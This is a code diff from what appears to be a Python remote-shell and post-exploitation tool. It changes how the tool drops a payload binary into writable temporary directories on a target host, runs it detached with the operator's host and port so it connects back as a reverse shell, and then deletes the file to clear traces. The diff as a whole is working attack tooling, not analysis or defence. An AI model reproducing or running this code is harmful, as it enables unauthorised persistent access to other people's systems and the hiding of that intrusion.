@@ -41,9 +41,7 @@ class NetShell(cmd.Cmd):
         self.id = None
         self.output = None
         self.shell_active = True
-
-        # Thread(target=self.is_alive).start()
-
+        Thread(target=self.is_alive).start()
 
     def default(self, line):
         local_shell(line)
@@ -103,7 +101,6 @@ class NetShell(cmd.Cmd):
                 if len(data) == 0:
                     raise ConnectionError
             except (BlockingIOError, AttributeError):
-                # This means the socket is still open but there's no data to receive
                 pass
             except (ConnectionError, OSError, ValueError):
                 logging.error(f"Session {self.id +1}: Connection lost")
@@ -281,18 +278,19 @@ class LocalShell(cmd.Cmd):
                 logging.info(f"Sending payload")
 
                 payload_con = SendPayload(sock)
+                sock.send_command("cd /tmp || cd /var/tmp || cd /dev/shm")
                 payload_con.listen(host)
                 payload_con.send_file(os.path.join(PROJ_DIR, "payloads/payload"))
                 logging.info(f"File sent")
 
-                test = pretty(sock.send_command("/tmp/payload --test"))
+                test = pretty(sock.send_command("./payload --test"))
 
                 if not test == "Hello world! Wasd":
                     logging.error("Thing did not run")
                     raise Exception
 
                 logging.debug(f"Payload sent. Starting listener")
-                sock.client_socket.send(f"setsid sh -c '/tmp/payload --host {host} --port {port}'".encode())
+                sock.client_socket.send(f"setsid sh -c './payload --host {host} --port {port}'".encode())
 
                 sock.server_socket.close()
                 sock.client_socket.close()
@@ -319,7 +317,7 @@ class LocalShell(cmd.Cmd):
                     return
 
                 if not sock: return
-                # sock.send_command("cmd rm -rf payload")
+                sock.send_command("cmd rm -rf payload")
                 self.current_session = NetShell(sock)
                 self.current_session.session_type = "python"
             except Exception as e:
